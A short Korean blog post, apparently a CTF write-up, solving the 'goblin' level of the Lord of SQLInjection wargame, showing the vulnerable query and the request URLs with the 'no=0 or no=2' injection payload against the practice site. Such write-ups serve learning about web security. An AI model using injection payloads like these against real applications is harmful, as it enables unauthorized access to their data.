---
title: "Lord of SQLInjection: goblin"
date: 2025-01-21
summary: ""
category: "보안/CTF 풀이"
tags: ["CTF", "웹 보안"]
sourceUrl: "https://learntoflyclotilde.tistory.com/entry/Lord-of-SQLInjection-goblin"
draft: false
---

## **{{color:#ee2323}}Problem{{/color}}**

![Lord of SQLInjection: goblin 이미지 1](/assets/posts/los-goblin/image-01.png)

---

## **{{color:#337ea9}}Solve{{/color}}**

- **기존 구문 > {{bg:#f6e199}}GET 방식, id = guest 고정{{/bg}}**

```

select id from prob_goblin where id='guest' and no={$_GET[no]}

```

- **변경 구문**

```

select id from prob_goblin where id='guest' and no=0 or no=2

```

- **공격 구문**

```

https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or no=1

```

![Lord of SQLInjection: goblin 이미지 2](/assets/posts/los-goblin/image-02.png)

```

https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or no=2

```

![Lord of SQLInjection: goblin 이미지 3](/assets/posts/los-goblin/image-03.png)
